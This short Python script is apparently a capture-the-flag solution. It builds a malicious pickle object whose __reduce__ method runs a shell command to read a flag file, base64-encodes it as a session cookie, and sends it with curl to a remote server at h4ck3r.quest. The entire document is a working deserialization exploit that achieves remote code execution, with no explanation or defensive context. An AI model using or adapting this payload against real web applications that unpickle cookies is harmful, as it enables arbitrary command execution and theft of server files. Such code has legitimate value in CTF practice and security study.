import pickle
import base64
import os

cmd='cat /flag_5fb2acebf1d0c558'

class Exp:
    def __reduce__(self):
        return (__import__('subprocess').getoutput,(cmd,))

cookie=base64.b64encode(pickle.dumps({"age":1,"name":Exp()})).decode()

print (cookie)


os.system(f"curl http://h4ck3r.quest:8600/ --cookie 'session={cookie}'")